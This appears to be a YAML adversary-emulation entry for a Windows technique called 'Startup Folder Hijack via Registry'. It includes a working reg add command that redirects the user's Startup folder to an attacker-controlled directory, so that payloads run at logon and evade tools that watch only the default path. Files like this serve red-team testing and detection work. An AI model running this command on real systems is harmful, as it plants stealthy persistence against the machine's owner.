name: Startup Folder Hijack via Registry

source: CTI Report
supported_platforms:
  - Windows
tactics:
  - Persistence
  - Defense Evasion
technique:
  - Boot or Logon Autostart Execution
  - Modify Registry
description: |
  This technique achieves stealthy persistence by modifying the 'User Shell Folders' registry key to 
  redefine the location of the system's trusted Startup folder. Instead of creating a new autorun entry 
  in the default location, it hijacks the legitimate startup mechanism itself, forcing the OS to execute 
  payloads from an attacker-controlled directory upon user logon. This method often bypasses security tools 
  that only monitor for file drops in the default Startup path.
execution:
  executor: powershell
  command: |
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Startup /t REG_EXPAND_SZ /d "#{malicious_path}" /f
arguments:
  malicious_path:
    Default: C:\ProgramData\SystemCore
    Required: true
    Description: The attacker-controlled directory that will become the new Startup folder.
preconditions:
  - (powershell ?eID - executor ?target - host)
effects:
  - (registry_modified ?target - host ?regPath - registry_key)
  - (startup_folder_modified ?target - host)
